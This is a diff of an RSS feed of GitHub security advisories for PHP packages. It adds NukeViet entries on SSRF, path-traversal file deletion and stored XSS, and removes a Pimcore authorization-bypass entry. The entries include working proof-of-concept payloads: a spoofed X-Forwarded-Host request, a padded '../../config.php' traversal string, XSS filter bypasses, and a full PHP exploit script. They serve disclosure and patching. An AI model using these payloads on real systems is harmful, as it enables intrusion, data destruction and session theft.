@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-07-13T17:27:56.513Z</updated>
+    <updated>2026-07-13T18:55:19.821Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,253 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[nukeviet/nukeviet] NukeViet: Pre-authentication SSRF via X-Forwarded-Host]]></title>
+        <id>https://github.com/advisories/GHSA-4chg-4752-w88r</id>
+        <link href="https://github.com/advisories/GHSA-4chg-4752-w88r"/>
+        <updated>2026-07-13T17:58:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthenticated attacker can coerce the server into issuing HTTP requests to an attacker-chosen host by spoofing the <code>X Forwarded-Host</code> (and <code>X-Forwarded-Proto</code>) request headers. The forwarded host is used, without validation, to build the URL that <code>server_info_update()</code> fetches with cURL, resulting in a Server-Side Request Forgery (SSRF) that requires no authentication.</p>
+<h2 id="affected-component">Affected component</h2>
+<ul>
+<li>File: <code>includes/ini.php</code> — function <code>server_info_update()</code> (cURL sink)</li>
+<li>File: <code>vendor/vinades/nukeviet/Core/Server.php</code> — <code>standardizeHost()</code> and the forwarded-header handling in the constructor (source of the tainted host)</li>
+<li>Trigger: <code>POST</code> request containing the field <code>__serverInfoUpdate=1</code>, handled early in <code>includes/ini.php</code> before any authentication.</li>
+</ul>
+<h2 id="details">Details</h2>
+<p><code>NukeViet\Core\Server</code> derives <code>original_host</code> / <code>original_protocol</code> from the <code>X-Forwarded-Host</code> / <code>X-Forwarded-Proto</code> headers and exposes them via <code>getOriginalHost()</code> / <code>getOriginalProtocol()</code>. These values are attacker-controlled and were not validated against the site's configured domains (<code>my_domains</code>).</p>
+<p>In <code>server_info_update()</code> the tainted host and scheme are concatenated directly into a cURL URL:</p>
+<pre><code class="language-php">$proto = $nv_Server-&gt;getOriginalProtocol();   // from X-Forwarded-Proto
+$host  = $nv_Server-&gt;getOriginalHost();        // from X-Forwarded-Host
+$ch = curl_init($proto . '://' . $host . NV_BASE_SITEURL . 'index.php?response_headers_detect=1');
+curl_exec($ch);
+</code></pre>
+<p>Two factors made this reliably reachable:</p>
+<ol>
+<li>The <code>__serverInfoUpdate</code> handler runs very early in <code>includes/ini.php</code>, before authentication, so the sink is reachable pre-auth.</li>
+<li>The host sanitiser <code>standardizeHost()</code> stripped a trailing port only with the regex <code>(\:[0-9]+)$</code>, which is bypassed by appending a slash (e.g. <code>127.0.0.1:8081/</code>): the string no longer ends in <code>:digits</code>, so the port survives and an arbitrary <code>host:port</code> reaches the cURL call.</li>
+</ol>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-http">POST /index.php HTTP/1.1
+Host: &lt;victim&gt;
+X-Forwarded-Proto: http
+X-Forwarded-Host: &lt;attacker-controlled-host&gt;:&lt;port&gt;/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+__serverInfoUpdate=1
+</code></pre>
+<p>The server then issues a request to the attacker-supplied host, confirmed via an out-of-band interaction (DNS + HTTP) on a collaborator endpoint.</p>
+<h2 id="impact">Impact</h2>
+<p>The SSRF is <strong>blind</strong>, <strong>HEAD-only</strong>, and uses a <strong>fixed request path</strong> (<code>…/index.php?response_headers_detect=1</code>):</p>
+<ul>
+<li>The fetched response is stored server-side in the <code>config_ini</code> cache and is <strong>not reflected</strong> to the attacker, so internal data cannot be exfiltrated directly.</li>
+<li>Because the path is fixed and not attacker-controlled, cloud metadata endpoints (e.g. <code>169.254.169.254/latest/meta-data/...</code>) cannot be reached, and <code>gopher://</code> / <code>dict://</code> request smuggling cannot inject arbitrary payloads.</li>
+</ul>
+<p>What an attacker <strong>can</strong> do: unauthenticated internal host/port discovery (connection success/timing, with the port reachable through the regex bypass), and poisoning of the cached <code>server_headers</code> (the SSRF target's response headers are stored and applied to the site).</p>
+<h2 id="severity">Severity</h2>
+<p>Rated <strong>High</strong> rather than Critical, because the blind + fixed-path + HEAD design of the sink prevents data exfiltration, cloud credential theft, and internal RCE.</p>
+<ul>
+<li>CVSS v3.1 Base Score: <strong>7.2 (High)</strong></li>
+<li>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N</code></li>
+</ul>
+<h2 id="weakness">Weakness</h2>
+<ul>
+<li>Primary: <strong>CWE-918: Server-Side Request Forgery (SSRF)</strong></li>
+<li>Contributing: CWE-20 (Improper Input Validation), CWE-644 (Improper Neutralization of HTTP Headers used by downstream components / trusting <code>X-Forwarded-*</code>).</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Fixed by validating and normalising the forwarded values at the source and gating the request before the sink:</p>
+<ul>
+<li><code>standardizeHost()</code> now extracts the host with <code>parse_url()</code> (defeats the <code>:port/</code> bypass) and lower-cases it.</li>
+<li><code>X-Forwarded-Proto</code> is restricted to a <code>{http, https}</code> allow-list and falls back to the real server protocol otherwise.</li>
+<li><code>X-Forwarded-Port</code> is validated as numeric and within range.</li>
+<li>The incoming host is checked against <code>my_domains</code> before <code>includes/ini.php</code> is reached; non-matching hosts are rejected/redirected, and <code>server_info_update()</code> additionally re-validates its target host against <code>my_domains</code> (defense in depth).</li>
+</ul>
+<h2 id="workaround">Workaround</h2>
+<p>Configure the reverse proxy / web server to strip or override client-supplied <code>X-Forwarded-Host</code>, <code>X-Forwarded-Proto</code>, and <code>X-Forwarded-Port</code> headers, and ensure <code>my_domains</code> is configured with the site's canonical domain(s).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nukeviet/nukeviet/security/advisories/GHSA-4chg-4752-w88r">https://github.com/nukeviet/nukeviet/security/advisories/GHSA-4chg-4752-w88r</a></li>
+<li><a href="https://github.com/advisories/GHSA-4chg-4752-w88r">https://github.com/advisories/GHSA-4chg-4752-w88r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4chg-4752-w88r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-13T17:58:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nukeviet/nukeviet] NukeViet: Path Traversal to Arbitrary File Deletion in Edit Comment Function]]></title>
+        <id>https://github.com/advisories/GHSA-c9xg-64p9-f2jj</id>
+        <link href="https://github.com/advisories/GHSA-c9xg-64p9-f2jj"/>
+        <updated>2026-07-13T17:55:48.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Path Traversal to Arbitrary File Deletion in the Edit Comment admin function. An authenticated administrator can delete arbitrary files within the application root (e.g., <code>config.php</code>) by injecting a crafted <code>attach</code> parameter, rendering the application inoperable.</p>
+<h2 id="affected-component">Affected Component</h2>
+<p><code>modules/comment/admin/edit.php</code></p>
+<h2 id="root-cause">Root Cause</h2>
+<p>In the vulnerable version, the <code>attach</code> parameter received via HTTP POST was not validated before being processed:</p>
+<pre><code class="language-php">// Vulnerable code (before fix)
+$attach = $nv_Request-&gt;get_string('attach', 'post', '', true);
+if (!empty($attach)) {
+    $attach = substr($attach, strlen(NV_BASE_SITEURL . NV_UPLOADS_DIR . '/' . $module_upload . '/'));
+}
+</code></pre>
+<p><code>substr()</code> strips the first N characters (equal to the length of the upload URL prefix, e.g. 26 chars for <code>/nukeviet/uploads/comment/</code>). By padding the payload with exactly 26 arbitrary characters followed by a path traversal sequence, an attacker can store <code>../../&lt;target&gt;</code> directly into the database.</p>
+<p>When the comment is subsequently deleted, <code>del.php</code> reads <code>attach</code> from the database and calls:</p>
+<pre><code class="language-php">nv_deletefile(NV_UPLOADS_REAL_DIR . '/' . $module_upload . '/' . $row['attach']);
+</code></pre>
+<p><code>nv_deletefile()</code> resolves the path via <code>realpath()</code> and only verifies the result is within <code>NV_ROOTDIR</code> — it does <strong>not</strong> restrict deletion to the uploads directory — allowing deletion of any file in the installation root.</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<ol>
+<li>Log in as an administrator and navigate to <strong>Admin → Comment Management</strong>.</li>
+<li>Select any comment and open the Edit form.</li>
+<li>Intercept the POST request and set the <code>attach</code> parameter to:</li>
+</ol>
+<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaa../../config.php
+</code></pre>
+<p><em>(26 padding characters + traversal path)</em></p>
+<ol start="4">
+<li>Submit the request. The value <code>../../config.php</code> is now stored in the database.</li>
+<li>Delete the comment. <code>config.php</code> is deleted from the application root.</li>
+<li>The application immediately redirects to the install wizard, confirming the file has been removed.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Any file readable by the web server process within <code>NV_ROOTDIR</code> can be permanently deleted.</li>
+<li>Deleting <code>config.php</code> causes a full application outage and exposes the install wizard.</li>
+</ul>
+<h2 id="severity">Severity</h2>
+<p><strong>CVSS v3.1 Base Score: 8.7 (High)</strong></p>
+<pre><code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:H
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Attack Vector</td>
+<td>Network</td>
+</tr>
+<tr>
+<td>Attack Complexity</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>Privileges Required</td>
+<td>High (Admin required)</td>
+</tr>
+<tr>
+<td>User Interaction</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Changed</td>
+</tr>
+<tr>
+<td>Confidentiality</td>
+<td>None</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td>High</td>
+</tr>
+<tr>
+<td>Availability</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<h2 id="fix">Fix</h2>
+<p>Added <code>nv_is_file()</code> validation before processing the <code>attach</code> value. This function uses <code>realpath()</code> and a regex check to ensure the file resolves to a path within the intended upload directory, rejecting any traversal attempts.</p>
+<pre><code class="language-php">// Fixed code
+$attach = $nv_Request-&gt;get_string('attach', 'post', '');
+if (!empty($attach) and nv_is_file($attach, NV_UPLOADS_DIR . '/' . $module_upload)) {
+    $attach = substr($attach, strlen(NV_BASE_SITEURL . NV_UPLOADS_DIR . '/' . $module_upload . '/'));
+} else {
+    $attach = '';
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nukeviet/nukeviet/security/advisories/GHSA-c9xg-64p9-f2jj">https://github.com/nukeviet/nukeviet/security/advisories/GHSA-c9xg-64p9-f2jj</a></li>
+<li><a href="https://github.com/advisories/GHSA-c9xg-64p9-f2jj">https://github.com/advisories/GHSA-c9xg-64p9-f2jj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c9xg-64p9-f2jj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-13T17:55:48.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nukeviet/nukeviet] NukeViet: Multiple Anti-XSS Filter Bypasses Leading to Stored XSS in News Module]]></title>
+        <id>https://github.com/advisories/GHSA-465g-4q99-5x86</id>
+        <link href="https://github.com/advisories/GHSA-465g-4q99-5x86"/>
+        <updated>2026-07-13T17:54:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Two filter-bypass techniques in <code>NukeViet\Core\Request::filterAttr()</code> and <code>NukeViet\Core\Request::unhtmlentities()</code> allow a low-privileged user (any account with news post permission) to store and serve arbitrary JavaScript to any visitor of the affected page.</p>
+<h2 id="affected-component">Affected Component</h2>
+<p><code>vendor/vinades/nukeviet/Core/Request.php</code> — class <code>NukeViet\Core\Request</code></p>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<h3 id="bypass-1--form-feed-character-prefix-x0c-before-event-handler-name">Bypass 1 — Form Feed character prefix (<code>\x0C</code>) before event handler name</h3>
+<p>The <code>filterAttr()</code> method blocks event-handler attributes using:</p>
+<pre><code class="language-php">preg_match('/^on/i', $attrSubSet[0])
+</code></pre>
+<p>PHP's <code>trim()</code> does <strong>not</strong> strip the ASCII Form Feed character (<code>\x0C</code>, U+000C). An attacker can prefix the attribute name with <code>\x0C</code> so that <code>\x0Conerror</code> does not match <code>/^on/</code>. The HTML5 browser parser treats <code>\x0C</code> as a valid whitespace separator and correctly activates the event handler.</p>
+<p><strong>Proof-of-concept payload (URL-encoded POST body field <code>bodyhtml</code>):</strong></p>
+<pre><code>&lt;img src="x" %0Conerror="alert('XSS')"&gt;
+</code></pre>
+<h3 id="bypass-2--decimal-html-entity-tab-9-inside-javascript-uri">Bypass 2 — Decimal HTML entity tab (<code>&amp;#9;</code>) inside <code>javascript:</code> URI</h3>
+<p><code>unhtmlentities()</code> strips the hex-encoded tab <code>&amp;#x09;</code> via <code>str_ireplace</code>, but did <strong>not</strong> strip its decimal equivalent <code>&amp;#9;</code>. The keyword-blocking regex <code>/j\s*a\s*v\s*a\s*s\s*c\s*r\s*i\s*p\s*t/si</code> uses <code>\s*</code> which does not match HTML entities. The value <code>jav&amp;#9;ascript:alert()</code> passes the filter, is stored in the database, and is decoded by the browser into a working <code>javascript:</code> URI.</p>
+<p><strong>Proof-of-concept payload (inside a Markdown-style link):</strong></p>
+<pre><code>[Click me](jav&amp;#9;ascript:alert('XSS'))
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An authenticated attacker with news-posting permission can inject persistent JavaScript that executes in the browser of <strong>any user</strong> (including administrators) who views the affected article. This enables session cookie theft, credential harvesting, defacement, and further privilege escalation.</p>
+<h2 id="patches">Patches</h2>
+<p>Fixed in commit <code>&lt;commit-sha&gt;</code> by modifying <code>vendor/vinades/nukeviet/Core/Request.php</code>:</p>
+<ol>
+<li><p><strong><code>filterAttr()</code></strong> — strip all ASCII control characters (<code>\x00</code>–<code>\x20</code>) from the attribute name before the <code>/^on/</code> check:</p>
+<pre><code class="language-php">$attrSubSet[0] = preg_replace('/[\x00-\x20]/', '', strtolower($attrSubSet[0]));
+</code></pre>
+</li>
+<li><p><strong><code>unhtmlentities()</code></strong> — strip decimal HTML entities for all ASCII control characters (0–31) before the keyword checks:</p>
+<pre><code class="language-php">$value = preg_replace('/&amp;#0*(?:3[01]|[12][0-9]|[0-9]);/', '', $value);
+</code></pre>
+</li>
+</ol>
+<h2 id="workarounds">Workarounds</h2>
+<p>None. Update to the patched version.</p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li>CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)</li>
+<li>OWASP WSTG-INPV-02: Testing for Stored Cross Site Scripting</li>
+<li><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 A03:2021 – Injection</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nukeviet/nukeviet/security/advisories/GHSA-465g-4q99-5x86">https://github.com/nukeviet/nukeviet/security/advisories/GHSA-465g-4q99-5x86</a></li>
+<li><a href="https://github.com/advisories/GHSA-465g-4q99-5x86">https://github.com/advisories/GHSA-465g-4q99-5x86</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-465g-4q99-5x86</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-13T17:54:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nukeviet/nukeviet] NukeViet: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')]]></title>
         <id>https://github.com/advisories/GHSA-w2w5-w2pw-r929</id>
@@ -2586,741 +2833,5 @@ docker compose exec -T php php tools/poc_wordexport.php
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-05-27T22:27:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore has a WordExport Authorization Bypass for Unauthorized Document Export]]></title>
-        <id>https://github.com/advisories/GHSA-332x-r494-54fq</id>
-        <link href="https://github.com/advisories/GHSA-332x-r494-54fq"/>
-        <updated>2026-07-10T19:07:26.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>WordExport</code> export flow only checks whether the current backend user has the feature permission <code>word_export</code>. It does not verify access rights on the target element itself.<br>As a result, a low-privileged backend user can export document content even when the user does not have <code>view</code> permission on that document.</p>
-<p>In the local Docker reproduction, a low-privileged user successfully exported sensitive content from a page the user was not allowed to view:</p>
-<ul>
-<li><code>POC-WORDEXPORT-TITLE</code></li>
-<li><code>POC-WORDEXPORT-DESC</code></li>
-</ul>
-<h3 id="root-cause">Root Cause</h3>
-<p>The controller only performs a feature-level permission check before starting the export flow:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L44)#L41"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L41">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56)#L44">TranslationController.php</a></li>
-</ul>
-<p>It then directly resolves the target element from attacker-controlled <code>type/id</code> input:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L56"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L58">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/%5BTranslationController.php%5D(https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113)#L58"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72">TranslationController.php</a></li>
-</ul>
-<p>For document-like elements such as <code>Page</code> and <code>Snippet</code>, it renders content in an admin context:</p>
-<ul>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L72"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L113">TranslationController.php</a></li>
-<li><a href="pimcore-12.3.3/bundles/WordExportBundle/src/Controller/TranslationController.php#L114">TranslationController.php</a></li>
-</ul>
-<p>No object-level authorization check such as <code>isAllowed('view')</code> is enforced on the target element.</p>
-<h3 id="affected-scope">Affected Scope</h3>
-<p>Based on the source code, the following element types may be affected:</p>
-<ul>
-<li><code>page</code></li>
-<li><code>snippet</code></li>
-<li><code>email</code></li>
-<li><code>object</code></li>
-</ul>
-<p>For page-like documents, the <code>pimcore_admin = true</code> rendering context may expose additional backend-visible content.</p>
-<h3 id="preconditions">Preconditions</h3>
-<ul>
-<li>The attacker is an authenticated backend user</li>
-<li>The attacker has the <code>word_export</code> permission</li>
-<li>The attacker does not have <code>view</code> permission on the target document</li>
-</ul>
-<h3 id="reproduction-environment">Reproduction Environment</h3>
-<ul>
-<li>Reproduction root: <code>pimcore-12.3.3-repro</code></li>
-<li>Standalone PoC script: <a href="pimcore-12.3.3-repro/tools/poc_wordexport.php"></a><a href="https://github.com/pimcore/pimcore/security/advisories/pimcore-12.3.3-repro/tools/poc_wordexport.php">poc_wordexport.php</a></li>
-</ul>
-<pre><code class="language-php">&lt;?php
-declare(strict_types=1);
-
-use Pimcore\Bundle\WordExportBundle\Controller\TranslationController as WordExportController;
-use Pimcore\Controller\UserAwareController;
-use Pimcore\Model\Document\Page;
-use Pimcore\Model\User;
-use Pimcore\Security\User\TokenStorageUserResolver;
-use Pimcore\Security\User\User as SecurityUser;
-use Pimcore\Serializer\Serializer as PimcoreSerializer;
-use Pimcore\Tool\Authentication;
-use Symfony\Component\DependencyInjection\ContainerInterface;
-use Symfony\Component\Filesystem\Filesystem;
-use Symfony\Component\HttpFoundation\Request;
-use Symfony\Component\HttpFoundation\RequestStack;
-use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
-use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorage;
-
-require dirname(__DIR__) . '/vendor/autoload.php';
-
-define('PIMCORE_PROJECT_ROOT', dirname(__DIR__));
-
-try {
-    \Pimcore\Bootstrap::bootstrap();
-
-    $kernel = new \App\Kernel('dev', true);
-    \Pimcore::setKernel($kernel);
-    $kernel-&gt;boot();
-
-    $container = $kernel-&gt;getContainer();
-
-    /** @var RequestStack $requestStack */
-    $requestStack = getService($container, [
-        RequestStack::class,
-        'request_stack',
-    ]);
-
-    $admin = User::getByName('admin');
-    if (!$admin instanceof User) {
-        fail('admin user is missing');
-    }
-
-    $auditor = User::getByName('auditor_wordexport');
-    if (!$auditor instanceof User) {
-        $auditor = new User();
-        $auditor-&gt;setParentId(0);
-        $auditor-&gt;setName('auditor_wordexport');
-    }
-
-    $auditor-&gt;setAdmin(false);
-    $auditor-&gt;setActive(true);
-    $auditor-&gt;setPassword(Authentication::getPasswordHash('auditor_wordexport', 'auditor-pass'));
-    $auditor-&gt;setPermissions(['word_export']);
-    $auditor-&gt;setRoles([]);
-    $auditor-&gt;setWorkspacesDocument([]);
-    $auditor-&gt;setWorkspacesAsset([]);
-    $auditor-&gt;setWorkspacesObject([]);
-    $auditor-&gt;save();
-
-    $page = Page::getByPath('/poc-wordexport-secret-page');
-    if (!$page instanceof Page) {
-        $page = new Page();
-        $page-&gt;setParentId(1);
-        $page-&gt;setKey('poc-wordexport-secret-page');
-    }
-
-    $page-&gt;setPublished(true);
-    $page-&gt;setController('App\\Controller\\DefaultController::defaultAction');
-    $page-&gt;setTemplate('default/default.html.twig');
-    $page-&gt;setTitle('POC-WORDEXPORT-TITLE');
-    $page-&gt;setDescription('POC-WORDEXPORT-DESC');
-    $page-&gt;setProperty('language', 'text', 'en', false, true);
-    $page-&gt;setUserOwner($admin-&gt;getId());
-    $page-&gt;setUserModification($admin-&gt;getId());
-    $page-&gt;save();
-
-    $canViewPage = $page-&gt;getDao()-&gt;isAllowed('view', $auditor);
-
-    $tokenResolver = buildTokenResolver($auditor);
-    $controller = wireController(new WordExportController(), $container, $tokenResolver);
-
-    $exportId = 'wordexportpoc1';
-    $exportRequest = new Request([], [
-        'id' =&gt; $exportId,
-        'data' =&gt; json_encode([
-            ['type' =&gt; 'document', 'id' =&gt; $page-&gt;getId()],
-        ], JSON_THROW_ON_ERROR),
-        'source' =&gt; 'en',
-    ]);
-
-    $requestStack-&gt;push($exportRequest);
-    $controller-&gt;wordExportAction($exportRequest, new Filesystem());
-    $requestStack-&gt;pop();
-
-    $downloadRequest = new Request(['id' =&gt; $exportId]);
-    $requestStack-&gt;push($downloadRequest);
-    $downloadResponse = $controller-&gt;wordExportDownloadAction($downloadRequest);
-    $requestStack-&gt;pop();
-
-    $wordContent = (string) $downloadResponse-&gt;getContent();
-
-    echo json_encode([
-        'vulnerability' =&gt; 'wordexport_authorization_bypass',
-        'user' =&gt; [
-            'id' =&gt; $auditor-&gt;getId(),
-            'name' =&gt; $auditor-&gt;getName(),
-            'permissions' =&gt; $auditor-&gt;getPermissions(),
-        ],
-        'target_page' =&gt; [
-            'id' =&gt; $page-&gt;getId(),
-            'path' =&gt; $page-&gt;getFullPath(),
-            'title' =&gt; $page-&gt;getTitle(),
-            'description' =&gt; $page-&gt;getDescription(),
-            'user_can_view_page' =&gt; $canViewPage,
-        ],
-        'result' =&gt; [
-            'download_contains_title' =&gt; str_contains($wordContent, 'POC-WORDEXPORT-TITLE'),
-            'download_contains_description' =&gt; str_contains($wordContent, 'POC-WORDEXPORT-DESC'),
-        ],
-    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), PHP_EOL;
-} catch (Throwable $e) {
-    fail(sprintf(
-        '%s: %s in %s:%d%s',
-        $e::class,
-        $e-&gt;getMessage(),
-        $e-&gt;getFile(),
-        $e-&gt;getLine(),
-        $e-&gt;getTraceAsString() ? PHP_EOL . $e-&gt;getTraceAsString() : ''
-    ));
-}
-
-function wireController(
-    UserAwareController $controller,
-    ContainerInterface $container,
-    TokenStorageUserResolver $tokenResolver
-): UserAwareController
-{
-    $controller-&gt;setContainer($container);
-    $controller-&gt;setTokenResolver($tokenResolver);
-
-    if (method_exists($controller, 'setPimcoreSerializer')) {
-        /** @var PimcoreSerializer $serializer */
-        $serializer = getService($container, [
-            PimcoreSerializer::class,
-            'Pimcore\\Serializer\\Serializer',
-        ]);
-        $controller-&gt;setPimcoreSerializer($serializer);
-    }
-
-    return $controller;
-}
-
-function buildTokenResolver(User $user): TokenStorageUserResolver
-{
-    $tokenStorage = new TokenStorage();
-    $proxyUser = new SecurityUser($user);
-    $token = new UsernamePasswordToken($proxyUser, 'pimcore_admin', $proxyUser-&gt;getRoles());
-    $tokenStorage-&gt;setToken($token);
-
-    return new TokenStorageUserResolver($tokenStorage);
-}
-
-function getService(ContainerInterface $container, array $ids): mixed
-{
-    foreach ($ids as $id) {
-        try {
-            if ($container-&gt;has($id)) {
-                return $container-&gt;get($id);
-            }
-        } catch (Throwable) {
-        }
-    }
-
-    fail('Unable to resolve service: ' . implode(', ', $ids));
-}
-
-function fail(string $message): never
-{
-    fwrite(STDERR, $message . PHP_EOL);
-    exit(1);
-}
-</code></pre>
-<h3 id="reproduction-steps">Reproduction Steps</h3>
-<ol>
-<li>Create a low-privileged user named <code>auditor_wordexport</code> with only the <code>word_export</code> permission and no document workspace permissions.</li>
-<li>Create a test page at <code>/poc-wordexport-secret-page</code> containing sensitive values:<ul>
-<li><code>title = POC-WORDEXPORT-TITLE</code></li>
-<li><code>description = POC-WORDEXPORT-DESC</code></li>
-</ul>
-</li>
-<li>Verify that the user does not have <code>view</code> permission on that page.</li>
-<li>Execute <code>wordExportAction()</code> and <code>wordExportDownloadAction()</code> as that user.</li>
-<li>Check whether the exported HTML contains the sensitive values.</li>
-</ol>
-<p>Reproduction command:</p>
-<pre><code class="language-bash">cd pimcore-12.3.3-repro
-docker compose exec -T php php tools/poc_wordexport.php
-</code></pre>
-<h3 id="reproduction-result">Reproduction Result</h3>
-<p>Relevant PoC output:</p>
-<pre><code class="language-json">{
-  "vulnerability": "wordexport_authorization_bypass",
-  "user": {
-    "name": "auditor_wordexport",
-    "permissions": [
-      "word_export"
-    ]
-  },
-  "target_page": {
-    "path": "/poc-wordexport-secret-page",
-    "title": "POC-WORDEXPORT-TITLE",
-    "description": "POC-WORDEXPORT-DESC",
-    "user_can_view_page": false
-  },
-  "result": {
-    "download_contains_title": true,
-    "download_contains_description": true
-  }
-}
-</code></pre>
-<p>This shows that:</p>
-<ul>
-<li>The user cannot view the target page</li>
-<li>The exported file still contains the page's sensitive content</li>
-</ul>
-<p>This confirms that the issue is practically exploitable.</p>
-<h3 id="security-impact">Security Impact</h3>
-<ul>
-<li>Unauthorized disclosure of structured page fields</li>
-<li>Unauthorized export of restricted backend content</li>
-<li>Potential exposure of unpublished or otherwise restricted content</li>
-<li>Lateral data access by low-privileged backend accounts</li>
-</ul>
-<h3 id="remediation">Remediation</h3>
-<ol>
-<li>Perform object-level authorization immediately after resolving the element from <code>type/id</code>.</li>
-<li>Require at least <code>view</code> permission on the target element.</li>
-<li>Apply consistent authorization checks across <code>page</code>, <code>snippet</code>, <code>email</code>, and <code>object</code>.</li>
-<li>Bind export creation and export download to the requesting user or an equivalent authorization context.</li>
-<li>Add regression tests to ensure that users with <code>word_export</code> but without element <code>view</code> permission cannot export content.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-332x-r494-54fq">https://github.com/pimcore/pimcore/security/advisories/GHSA-332x-r494-54fq</a></li>
-<li><a href="https://github.com/pimcore/pimcore/pull/19112">https://github.com/pimcore/pimcore/pull/19112</a></li>
-<li><a href="https://github.com/pimcore/pimcore/commit/0ce2232b6f92c79d0ac244e95e21f55c37456ef1">https://github.com/pimcore/pimcore/commit/0ce2232b6f92c79d0ac244e95e21f55c37456ef1</a></li>
-<li><a href="https://github.com/pimcore/pimcore/releases/tag/v12.3.7">https://github.com/pimcore/pimcore/releases/tag/v12.3.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-332x-r494-54fq">https://github.com/advisories/GHSA-332x-r494-54fq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-332x-r494-54fq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-27T22:27:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore has a WordExport Authorization Bypass for Unauthorized Document Export]]></title>
-        <id>https://github.com/advisories/GHSA-332x-r494-54fq</id>
-        <link href="https://github.com/advisories/GHSA-332x-r494-54fq"/>
-        <updated>2026-07-10T19:07:26.000Z</updated>
